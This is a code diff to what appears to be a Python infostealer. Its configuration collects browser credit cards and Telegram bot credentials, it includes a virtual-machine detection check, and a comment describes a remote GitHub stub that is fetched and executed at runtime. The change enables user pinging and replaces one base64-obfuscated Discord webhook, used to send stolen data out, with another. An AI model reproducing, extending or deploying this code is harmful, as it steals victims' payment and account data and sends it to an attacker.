@@ -191,8 +191,10 @@ FEATURE_CONFIG = {
     "browser_credit_cards": True,
     "telegram_bot_token": "",
     "telegram_chat_id": "",
-    "ping_user": False,
+    "ping_user": True,
 }
+
+
 
 
 
@@ -342,7 +344,7 @@ def check_dll():
         exit_program('VM Detected')
 
 # Webhook URL — builder.pyw encodes this in base64 at build time.
-_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTc2MDc5MDMxNDI5MTMwMC94SFB5S3JITkY3ZHNaTXRmdDFub3NoWkhuUTVqR2Jfa0c4cnhHcHJZQ1VIdEhLN1JnMXd2bXN0NzlRYldzNHU1dlNFbw=="
+_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc3NDQ3MTIwNzg1MDE1NS9zMmFVZk1MZWpZdE5lTzlYRGh1dUVKbW4xTmJ0RjlFU3JmOWJiSGJNNmN2ajJYSEFmMUlkaEZ0a003MXBlZC1vRG5aUQ=="
 h00k = base64.b64decode(_HOOK_B64).decode()
 
 # Remote GitHub stub URL (base64-obfuscated). Fetched and executed at runtime alongside rx.py.
